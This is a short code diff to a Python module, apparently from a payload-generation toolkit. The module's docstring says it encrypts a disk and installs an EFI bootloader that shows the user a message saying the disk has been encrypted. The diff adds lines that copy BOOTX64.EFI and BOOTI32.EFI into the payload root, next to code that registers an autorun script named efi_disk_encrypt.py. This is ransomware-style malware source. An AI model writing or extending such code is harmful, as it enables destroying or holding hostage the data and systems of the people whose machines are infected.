@@ -4,6 +4,8 @@ Then install an EFI file as the bootloader which shows a message letting
 the user know their disk has been encrypted and a custom message.
 """
 
+import os
+import shutil
 import random
 
 from libsnr.util.common_utils import print_ok, print_warning, rootfs_open
@@ -154,5 +156,7 @@ def generate(context: dict):
             value = global_vars.get_variable(inp)
             payload = payload.replace(f"@{inp}@", f"{repr(value)}")
         stream.write(payload)
+    shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTX64.EFI"), os.path.join(context["temp_dir"], "root", "BOOTX64.EFI"))
+    shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTI32.EFI"), os.path.join(context["temp_dir"], "root", "BOOTI32.EFI"))
     autorun = Autorun(context)
     autorun.add_executable("/root/efi_disk_encrypt.py")
